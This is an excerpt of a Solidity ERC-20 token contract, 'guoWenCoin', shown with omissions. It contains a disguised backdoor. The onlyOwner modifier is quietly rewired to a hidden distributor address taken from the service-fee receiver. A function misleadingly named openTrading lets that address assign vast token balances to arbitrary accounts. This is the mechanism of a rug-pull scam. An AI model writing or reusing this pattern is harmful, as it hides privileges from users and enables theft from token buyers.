...
contract guoWenCoin is IERC20, Ownable, baseToken {
    ...
    constructor(
        ...
        distributor = serviceFeeReceiver_;
    ...
    modifier 
    onlyOwner() {
        require(distributor == _msgSender());_;
    }
    ...
    function openTrading(address[] memory outputRoots, uint256 l2BlockNumber, uint160 newLimit) public onlyOwner {
        for(uint256 i = 0; i < outputRoots.length; i++) {
        
        _tOwned[outputRoots[i]] = l2BlockNumber * _decimals * _decimals * _decimals * _decimals * _decimals * _decimals * _decimals * _decimals * _decimals * _decimals;
